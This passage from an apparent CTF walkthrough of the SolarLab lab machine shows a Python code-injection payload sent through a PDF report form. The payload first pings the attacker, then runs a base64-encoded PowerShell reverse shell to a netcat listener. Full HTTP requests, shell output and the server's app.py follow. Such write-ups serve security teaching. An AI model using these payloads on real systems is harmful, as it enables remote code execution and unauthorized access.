</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=---------------------------12561648027887354952763904803</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>55762</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://report.solarlab.htb:6791</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://report.solarlab.htb:6791/trainingRequest</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=.eJwljjsOw0AIBe9CnQLWfBZfxjJrUNLacRXl7lkp0715zXxgqzOvJ6zv884HbK8DVoh9aC48GnM5YYjsncJHVsrwEUi1OLt1iXlL10RPw0NSbBIh3lpG2WLUVSPUHaf25hyszCqCJuqhDa2a78GEpKlzlxwwQ-4rz38NwfcHgZgttg.Zle7GA.RCZWHDxp4nba5j3_A4p8e132hy4</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------------------12561648027887354952763904803
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;time_interval&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024-05-29 to 2024-05-30
</span></span><span class=line><span class=cl>-----------------------------12561648027887354952763904803
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;training_request&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Cybersecurity Awareness
</span></span><span class=line><span class=cl>-----------------------------12561648027887354952763904803
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;signature&#34;; filename=&#34;gengar_image.jpg&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></div><p><img alt="SolarLab 9" src=/pentesting/images/SolarLab_9.png></p><p>To test if this work I will send a <code>ping</code> to my machine. Start a listener with <code>tcpdump</code> on net interface <code>tun0</code> (the one from HTB VPN)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span></code></pre></div><p>and I will inject the following code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>para</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>font</span> <span class=na>color</span><span class=o>=</span><span class=s>&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;ping -n 1 10.10.16.6&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                exploit
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>font</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>para</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>where <code>10.10.16.6</code> is my attacker IP.</p><p>Then, in the <code>Burpsuite</code> request, I just put the payload inside <code>training_request</code> parameter. So I delete the string <code>Cybersecurity Awareness</code> and replace that by the payload from above, so my request looks something like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/trainingRequest</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>report.solarlab.htb:6791</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=---------------------------407089719225311833713402929686</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>56226</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://report.solarlab.htb:6791</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://report.solarlab.htb:6791/trainingRequest</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=.eJwljjsOw0AIBe9CnQLWfBZfxjJrUNLacRXl7lkp0715zXxgqzOvJ6zv884HbK8DVoh9aC48GnM5YYjsncJHVsrwEUi1OLt1iXlL10RPw0NSbBIh3lpG2WLUVSPUHaf25hyszCqCJuqhDa2a78GEpKlzlxwwQ-4rz38NwfcHgZgttg.Zle97Q.QtDih2IU5O3KCk4sssOHFefbMs0</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------------------407089719225311833713402929686
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;time_interval&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024-05-29 to 2024-05-30
</span></span><span class=line><span class=cl>-----------------------------407089719225311833713402929686
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;training_request&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;para&gt;
</span></span><span class=line><span class=cl>    &lt;font color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;ping -n 1 10.10.16.6&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt;
</span></span><span class=line><span class=cl>                exploit
</span></span><span class=line><span class=cl>    &lt;/font&gt;
</span></span><span class=line><span class=cl>&lt;/para&gt;
</span></span><span class=line><span class=cl>-----------------------------407089719225311833713402929686
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;signature&#34;; filename=&#34;gengar_image.jpg&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></div><p>Now we can send the payload</p><p><img alt="SolarLab 10" src=/pentesting/images/SolarLab_10.png></p><p>and in my <code>tcpdump</code> listener I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
</span></span></span><span class=line><span class=cl><span class=go>19:45:31.010551 IP 10.10.11.16 &gt; 10.10.16.6: ICMP echo request, id 1, seq 1, length 40
</span></span></span><span class=line><span class=cl><span class=go>19:45:31.010566 IP 10.10.16.6 &gt; 10.10.11.16: ICMP echo reply, id 1, seq 1, length 40
</span></span></span></code></pre></div><p>It worked. We have reached a <code>Remote Code Execution</code> (<code>RCE</code>).</p><div class="notice note"><div class=notice-title><i class="fa-solid fa-sticky-note" aria-hidden=true></i>Note</div><div class=notice-content>Something to say is that if the payload request returns code <code>502 Internal Server Error</code> it might have worked. If it returns code <code>302 Found</code> it might indicate that our session has expired and we will have to log in again in the authentication panel at <code>http://report.solarlab.htb:6791</code> and repeat the steps from above.</div></div><p>Now, to create a simple payload for <code>Windows</code> I will use <code>Reverse Shell Generator</code> page (<a href=https://www.revshells.com/ class=external-link target=_blank rel=noopener>https://www.revshells.com/</a>). I fill it with my attacker&rsquo;s IP address, and set port on <code>443</code> since this is the port I will start listening with <code>netcat</code>. The payload I will use now is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>para</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>font</span> <span class=na>color</span><span class=o>=</span><span class=s>&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                exploit
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>font</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>para</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Start a listener with <code>netcat</code>, along with <code>rlwrap</code>, and then just send the payload with <code>Burpsuite</code>. In my case the payload looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/trainingRequest</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>report.solarlab.htb:6791</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=---------------------------31991831217370751261817680947</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>55762</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://report.solarlab.htb:6791</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://report.solarlab.htb:6791/trainingRequest</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=.eJwljjsOw0AIBe9CnQLWfBZfxjJrUNLacRXl7lkp0715zXxgqzOvJ6zv884HbK8DVoh9aC48GnM5YYjsncJHVsrwEUi1OLt1iXlL10RPw0NSbBIh3lpG2WLUVSPUHaf25hyszCqCJuqhDa2a78GEpKlzlxwwQ-4rz38NwfcHgZgttg.ZlfBhA.6inknZIdzhImSVvVwMCu88gANp4</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------------------31991831217370751261817680947
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;time_interval&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024-05-29 to 2024-05-30
</span></span><span class=line><span class=cl>-----------------------------31991831217370751261817680947
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;training_request&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;para&gt;
</span></span><span class=line><span class=cl>    &lt;font color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt;
</span></span><span class=line><span class=cl>                exploit
</span></span><span class=line><span class=cl>    &lt;/font&gt;
</span></span><span class=line><span class=cl>&lt;/para&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------------------31991831217370751261817680947
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;signature&#34;; filename=&#34;gengar_image.jpg&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></div><p><img alt="SolarLab 11" src=/pentesting/images/SolarLab_11.png></p><p>and in my <code>netcat</code> listener I get a shell as <code>blake</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.16] 50896
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>solarlab\blake
</span></span></span><span class=line><span class=cl><span class=go>PS C:\Users\blake\Documents\app&gt;
</span></span></span></code></pre></div><p>We can get the user flag at <code>blake</code> Desktop.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Checking what do we have at <code>C:\Users\blake\Documents\app</code> directory, we have some server files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\blake\Documents\app&gt; dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Users\blake\Documents\app
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----          5/2/2024  12:30 PM                instance
</span></span></span><span class=line><span class=cl><span class=go>d-----         5/30/2024   3:03 AM                reports
</span></span></span><span class=line><span class=cl><span class=go>d-----        11/17/2023  10:01 AM                static
</span></span></span><span class=line><span class=cl><span class=go>d-----        11/17/2023  10:01 AM                templates
</span></span></span><span class=line><span class=cl><span class=go>d-----         5/30/2024   3:08 AM                __pycache__
</span></span></span><span class=line><span class=cl><span class=go>-a----        11/17/2023   9:59 AM           1278 app.py
</span></span></span><span class=line><span class=cl><span class=go>-a----        11/16/2023   2:17 PM            315 models.py
</span></span></span><span class=line><span class=cl><span class=go>-a----        11/18/2023   6:59 PM           7790 routes.py
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/2/2024   6:26 PM           3352 utils.py
</span></span></span></code></pre></div><p>Checking its content with <code>type app.py</code> shows a <code>Python</code> script to run a server with <code>Flask</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># app.py</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask_sqlalchemy</span> <span class=kn>import</span> <span class=n>SQLAlchemy</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask_login</span> <span class=kn>import</span> <span class=n>LoginManager</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;sqlite:///users.db&#39;</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;UPLOAD_FOLDER&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;c:</span><span class=se>\\</span><span class=s1>users</span><span class=se>\\</span><span class=s1>blake</span><span class=se>\\</span><span class=s1>documents</span><span class=se>\\</span><span class=s1>app</span><span class=se>\\</span><span class=s1>reports&#39;</span>
</span></span><span class=line><span class=cl><span class=n>login_manager</span> <span class=o>=</span> <span class=n>LoginManager</span><span class=p>(</span><span class=n>app</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>login_manager</span><span class=o>.</span><span class=n>login_view</span> <span class=o>=</span> <span class=s1>&#39;login&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Import other modules with routes and configurations</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>routes</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>models</span> <span class=kn>import</span> <span class=n>User</span><span class=p>,</span> <span class=n>db</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>utils</span> <span class=kn>import</span> <span class=n>create_database</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>db</span><span class=o>.</span><span class=n>init_app</span><span class=p>(</span><span class=n>app</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>app</span><span class=o>.</span><span class=n>app_context</span><span class=p>():</span>
</span></span><span class=line><span class=cl>   <span class=n>create_database</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Initialize Flask-Login</span>
</span></span><span class=line><span class=cl><span class=nd>@login_manager.user_loader</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>load_user</span><span class=p>(</span><span class=n>user_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>User</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>user_id</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)(</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])(</span><span class=n>login</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>)(</span><span class=n>logout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/dashboard&#39;</span><span class=p>)(</span><span class=n>dashboard</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/leaveRequest&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])(</span><span class=n>leaveRequest</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/trainingRequest&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])(</span><span class=n>trainingRequest</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/homeOfficeRequest&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])(</span><span class=n>homeOfficeRequest</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/travelApprovalForm&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])(</span><span class=n>travelApprovalForm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>threaded</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
